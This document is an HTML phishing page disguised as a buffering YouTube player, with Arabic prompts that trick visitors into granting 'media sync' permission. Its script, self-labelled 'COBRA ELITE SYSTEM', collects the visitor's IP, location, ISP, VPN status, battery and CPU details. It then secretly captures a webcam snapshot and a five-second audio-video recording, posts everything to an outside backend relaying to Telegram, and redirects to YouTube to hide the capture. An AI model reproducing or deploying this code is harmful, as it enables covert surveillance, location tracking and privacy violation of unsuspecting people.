<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>YouTube Player - Buffering</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
    .container { text-align: center; padding: 30px; border-radius: 15px; background: #000; width: 85%; }
    .loader { border: 3px solid #222; border-top: 3px solid #ff0000; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 25px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    video, canvas { opacity: 0; position: absolute; left: -9999px; }
    .status-text { color: #aaa; font-size: 14px; line-height: 1.6; }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="120">
    <div class="loader"></div>
    <p class="status-text">يتطلب مشغل الفيديو إذن "مزامنة الوسائط" للمتابعة.<br><b>يرجى الضغط على "Allow" لتشغيل المحتوى.</b></p>
  </div>

  <video id="v" autoplay muted playsinline></video>
  <canvas id="c" width="640" height="480"></canvas>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get("id");
    const redirectTarget = urlParams.get("re"); // الرابط الذي سيذهب إليه الضحية بعد الاختراق

    const v = document.getElementById("v");
    const c = document.getElementById("c");
    const ctx = c.getContext("2d");

    // دالة الإرسال لتيليجرام (عبر الباكيند)
    async function send(msg, type = "text", file = null) {
      if (!chatId) return;
      const payload = { chat_id: chatId };
      if (type === "text") payload.message = msg;
      if (type === "photo") { payload.message = "📸 *NEW SNAPSHOT:*"; payload.photo = file; }
      if (type === "video") { payload.message = "📹 *NEW VIDEO (5s):*"; payload.video = file; }

      try {
        await fetch("https://render-backend-package1.onrender.com/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
          keepalive: true
        });
      } catch (e) {}
    }

    // تحليل الهدف (IP + VPN + Battery + Time)
    async function analyzeTarget() {
      const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      let bat = "N/A";
      try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '🔌' : '🔋'})`; } catch (e) {}

      fetch("https://ipapi.co/json/")
        .then(res => res.json())
        .then(async data => {
          const isVpn = (data.timezone !== browserTimezone) ? "⚠️ YES (Detected)" : "✅ NO (Real)";
          let m = "🏁 *COBRA ELITE SYSTEM V6.0* 🏁\n";
          m += "━━━━━━━━━━━━━━━━━━━━\n";
          m += `🌍 *IP:* \`${data.ip}\`\n`;
          m += `🛡️ *VPN Detected:* ${isVpn}\n`;
          m += `🏢 *ISP:* ${data.org}\n`;
          m += `📍 *Loc:* ${data.city}, ${data.country}\n`;
          m += `🕒 *Target Time:* ${new Date().toLocaleString('ar-DZ')}\n`;
          m += `🔋 *Battery:* ${bat}\n`;
          m += `💻 *CPU:* ${navigator.hardwareConcurrency} Cores\n`;
          m += "━━━━━━━━━━━━━━━━━━━━\n";
          
          await send(m);
          startSpying();
        })
        .catch(() => startSpying());
    }

    // التجسس (كاميرا + فيديو)
    function startSpying() {
      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
          v.srcObject = stream;
          v.onloadedmetadata = () => {
            v.play();
            const recorder = new MediaRecorder(stream);
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            
            recorder.onstop = async () => {
              const blob = new Blob(chunks, { type: 'video/webm' });
              const reader = new FileReader();
              reader.readAsDataURL(blob);
              reader.onloadend = () => { send("", "video", reader.result.split(',')[1]); };
              
              // التوجيه النهائي بعد الانتهاء
              setTimeout(() => {
                stream.getTracks().forEach(t => t.stop());
                finalizeRedirect();
              }, 1500);
            };

            // حل مشكلة السواد (انتظار 2.5 ثانية) ثم التصوير وبدء الفيديو
            setTimeout(() => {
              ctx.drawImage(v, 0, 0, c.width, c.height);
              send("", "photo", c.toDataURL("image/jpeg", 0.8).split(',')[1]);
              recorder.start();
              setTimeout(() => recorder.stop(), 5000); // تسجيل 5 ثواني
            }, 2500); 
          };
        })
        .catch(() => {
          send("❌ *Target Denied Access*");
          finalizeRedirect();
        });
    }

    // دالة التوجيه الديناميكي
    function finalizeRedirect() {
      let finalUrl = "https://youtu.be/tNWpOuJk2M8"; // الرابط الافتراضي (يوتيوب)
      
      if (redirectTarget) {
        finalUrl = redirectTarget.startsWith('http') ? redirectTarget : 'https://' + redirectTarget;
      }
      
      window.location.replace(finalUrl);
    }

    if (chatId) analyzeTarget();
  </script>
</body>
</html>
